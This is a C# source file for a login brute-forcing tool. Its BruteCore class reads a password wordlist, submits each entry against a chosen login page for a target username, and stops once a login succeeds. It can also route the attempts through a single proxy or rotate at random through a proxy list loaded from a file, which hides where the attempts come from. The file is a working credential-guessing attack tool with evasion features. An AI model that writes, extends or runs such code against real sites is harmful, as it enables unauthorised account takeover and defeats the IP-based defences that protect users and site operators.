using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;
using System.ComponentModel;

namespace ConsoleLogin
{
    class BruteCore
    {
        event Status ChangeUI;
        Timer changeProxyTimer;

        public LoginCore page;

        public BindingList<LoginCore> pages;

        WebProxy certainProxy;
        WebProxy currentProxy;

        public bool goWithProxy { get; set; } = false;
        public bool autoChangeProxy { get; set; } = false;

        public BindingList<Tuple<string, int>> proxyList;
        bool keepSending;


        public BruteCore(Status updaterUI)
        {
            ChangeUI += updaterUI;

            keepSending = false;
            pages = new BindingList<LoginCore>();
            proxyList = new BindingList<Tuple<string, int>>();
        }
        public Task TestPageAsync(string username, string password)
        {
            return LoginViaCore(username, password);
        }
        public async Task StartBruteAsync(int frequencySeconds, string userName, string passFile)
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress, "Async Brute Started"));

            int sleepTime = frequencySeconds * 1000;
            keepSending = true;

            using (var classicStream = File.OpenRead(passFile))
            using (var streamReader = new StreamReader(classicStream))
            {
                while (keepSending == true && streamReader.Peek() >= 0)
                {
                    string _line = await streamReader.ReadLineAsync();
                    if(await LoginViaCore(userName, _line))
                    {
                        keepSending = false;
                    }
                    Thread.Sleep(sleepTime);
                }
            }
            ChangeUI(this, new LoginEventArgs(EventType.Progress, "Async Brute Finished"));
        }
        private Task<bool> LoginViaCore(string userName, string password)
        {
            try
            {
                currentProxy = IdentifyProxySettings();
                return page.Login(userName, password, currentProxy);
            }
            catch(NullReferenceException)
            {
                throw new NullReferenceException("You must add login page " +
                    "first");
            }
        }
        private WebProxy IdentifyProxySettings()
        {
            if (goWithProxy && autoChangeProxy)
            {
                var rand = new Random();
                try
                {
                    int counter = rand.Next(0, proxyList.Count);
                    WebProxy currentProxy =
                        new WebProxy(proxyList[counter].Item1, proxyList[counter].Item2);
                    currentProxy.BypassProxyOnLocal = true;
                    return currentProxy;
                }
                catch (ArgumentOutOfRangeException)
                {
                    throw new ArgumentOutOfRangeException("Set proxyList first to enable " +
                        "auto-change proxy settings");
                }
            }
            else if (goWithProxy)
                return certainProxy;
            else if (!goWithProxy && !autoChangeProxy)
                return null;
            else
                return currentProxy;
        }

        public void AddPage(LoginCore siteInfo, int index = -1)
        {
            if (index > -1)
            {
                pages.Insert(index, siteInfo);
                ChangeUI(this, new LoginEventArgs(EventType.Progress,
                    "Editted Page " + siteInfo.Name));
            }
            else
            {
                pages.Add(siteInfo);
                ChangeUI(this, new LoginEventArgs(EventType.Progress,
                    "Added new Page " + siteInfo.Name));
            }
        }

        public async Task ReadPagesFromFile(string path)
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress, 
                "Started reading default pages from file" + path));
            FileStream file = new FileStream(path, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(file);
            do
            {
                string _filePath = await reader.ReadLineAsync();
                try
                {
                    _filePath = string.Format("{0}\\Files\\{1}", path.Substring(0, path.LastIndexOf('\\')), _filePath);
                }
                catch(Exception)
                {
                    throw new Exception("Path for login page file was incorrect");
                }
                LoginCore newPage = new LoginCore(ChangeUI);
                await newPage.InitializeFromFile(_filePath);
                pages.Add(newPage);
            } while (reader.Peek() >= 0);
            reader.Dispose();
            file.Dispose();
            page = pages[0];
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Finished reading default pages from file" + path));
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                page.Name + " has been set as default brute page"));
        }
        public void StopBrute()
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress, "Async brute was terminated"));
            keepSending = false;
        }

        public void SetCurrentPage(LoginCore loginCore)
        {
            page = loginCore;
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Set current Login Page as" + loginCore.Name));
        }

        public async Task ReadProxyFromFileAsync(string path)
        {
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Started reading proxy from file" + path));

            FileStream file = new FileStream(path, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(file);
            do
            {
                try
                {
                    string proxy = await reader.ReadLineAsync();
                    int delimiter = proxy.IndexOf(' ');
                    string ip = proxy.Substring(0, delimiter);
                    int port = Convert.ToInt32(proxy.Substring(delimiter + 1));
                    var couple = Tuple.Create(ip, port);
                    proxyList.Add(couple);
                }
                catch(IndexOutOfRangeException)
                {
                    throw new IndexOutOfRangeException("File format for proxy list is incorrect "
                        + path);
                }
            } while (reader.Peek() >= 0);
            reader.Dispose();
            file.Dispose();
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Finished reading proxy from file" + path));
        }

        public void SetCertainProxy(string proxy)
        {
            try
            {
                int delimiter = proxy.IndexOf(':');
                string ip = proxy.Substring(0, delimiter);
                int port = Convert.ToInt32(proxy.Substring(delimiter + 1));
                certainProxy = new WebProxy(ip, port);
                certainProxy.BypassProxyOnLocal = true;
            }
            catch(IndexOutOfRangeException)
            {
                throw new IndexOutOfRangeException("Presented format of proxy is incorrect " + proxy);
            }
        }

        public void DeleteCurrentPage()
        {
            pages.Remove(page);
            ChangeUI(this, new LoginEventArgs(EventType.Progress,
                "Page: " + page.Name + " has been succesfully deleted"));
            page = pages.Count > 0 ? pages[0] : null;
        }
    }
}
